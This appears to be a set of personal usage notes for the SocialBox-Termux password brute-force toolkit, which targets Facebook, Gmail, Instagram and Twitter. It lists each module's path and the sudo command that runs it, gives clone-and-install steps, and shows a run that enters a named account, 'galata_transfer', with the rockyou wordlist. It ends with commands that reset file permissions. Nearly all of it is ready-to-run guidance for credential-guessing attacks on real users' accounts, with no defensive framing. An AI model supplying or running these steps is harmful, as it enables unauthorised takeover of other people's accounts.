| Module          | Path                   | Target    |
| --------------- | ---------------------- | --------- |
| Facebook BF #1  | `facebook/fb-brute.pl` | Facebook  |
| Gmail BF        | `Gemail-Hack/`         | Gmail     |
| Instagram BF #1 | `instainsane/`         | Instagram |
| Twitter BF      | `tweetshell/`          | Twitter   |
| Instagram BF #2 | `insta-bf/`            | Instagram |
| Facebook BF #2  | `fikrado.py/`          | Facebook  |

| Module       | Command                                        |
| ------------ | ---------------------------------------------- |
| Facebook #1  | `sudo perl facebook/fb-brute.pl`               |
| Gmail        | `cd Gemail-Hack && sudo python2 gemailhack.py` |
| Instagram #1 | `sudo bash instainsane/instainsane.sh`         |
| Twitter      | `sudo bash tweetshell/tweetshell.sh`           |
| Instagram #2 | `cd insta-bf && sudo python instabf.py`        |
| Facebook #2  | `cd fikrado.py && sudo python2 fikrado.py`     |

# Instagram #1 (Tor-based, multithreaded)
cd /tmp/SocialBox-Termux && sudo bash instainsane/instainsane.sh

# Instagram #2 (web login)
cd /tmp/SocialBox-Termux/insta-bf && sudo python instabf.py


Username account: galata_transfer
Password List (Enter to default list): /usr/share/wordlists/rockyou.txt


```
git clone https://github.com/samsesh/SocialBox-Termux.git 
cd SocialBox-Termux
chmod +x install-sb.sh
./install-sb.sh
```


# 1) reclaim the root-owned component, then re-audit it
sudo chown -R camara:camara /home/camara/SocialBox-Termux/fikrado.py
sudo chmod 755 /home/camara/SocialBox-Termux/fikrado.py

# 2) remove the world-write window from chmod 777 -R
cd /home/camara/SocialBox-Termux
chmod -R go-w .
find . -type d -exec chmod 755 {} +
find . -type f -name '*.sh' -exec chmod 755 {} +